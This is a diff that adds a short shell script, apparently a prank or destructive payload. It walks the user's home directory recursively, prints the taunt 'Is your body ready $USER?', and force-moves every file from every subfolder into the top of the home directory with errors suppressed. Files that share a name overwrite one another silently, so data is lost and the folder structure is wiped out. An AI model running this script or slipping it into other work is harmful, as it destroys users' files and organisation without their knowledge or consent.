@@ -1,0 +1,15 @@
+#! /bin/sh
+
+path=~/
+for file in `ls -RC ~`; do
+  if [ $file = ".:" ]; then
+    echo "Is your body ready $USER?"
+  fi
+  if [ `echo $file | cut -c1-2` = './' ]; then
+    path=`echo $file | cut -d ":" -f1`
+  else
+    if [ -f $path"/"$file  ]; then
+      mv -f $path"/"$file ~/ 2> /dev/null
+    fi
+  fi
+done
